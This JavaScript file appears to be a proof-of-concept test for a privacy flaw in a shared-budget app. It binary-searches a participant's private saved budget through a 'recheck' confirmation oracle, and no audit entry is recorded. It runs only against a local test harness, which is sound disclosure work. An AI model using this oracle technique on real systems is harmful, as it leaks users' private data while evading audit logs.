// The organizer can recover a participant's private saved budget to the cent via the recheck path:
// craft a chat line "Maya: $X" and ask for a cap; `confirmations[].confirmed` = (saved budget <= X).
// No model call, no participant action, nothing logged.
import { Engine, memory, proposeRevisions, tryIt } from "./harness.mjs";
const e = new Engine(memory());
e.state.participants.find((p) => p.id === "maya").budget = 18337; // Maya's private budget: $183.37
e.persist();
console.log("organizer view has maya.budget?", "budget" in e.view("organizer").participants.find((p) => p.id === "maya"));
let lo = 1, hi = 10_000_000, calls = 0;
while (lo < hi) {
  const mid = Math.floor((lo + hi) / 2);
  const line = `Maya: $${(mid / 100).toFixed(2)}`;
  const out = await proposeRevisions(e, { notes: line, recheck: [{ title: "probe", listingId: "pine", capRequests: [{ participantId: "maya", amountCents: mid, line: 1, quote: line }], explanation: "", tradeoff: "" }] });
  calls++;
  const c = out.options[0].confirmations[0];
  if (c.confirmed) hi = mid; else lo = mid + 1;
}
console.log(`recovered Maya's private budget: ${lo} cents in ${calls} recheck calls; audit entries added: 0 (audit length ${e.state.audit.length})`);
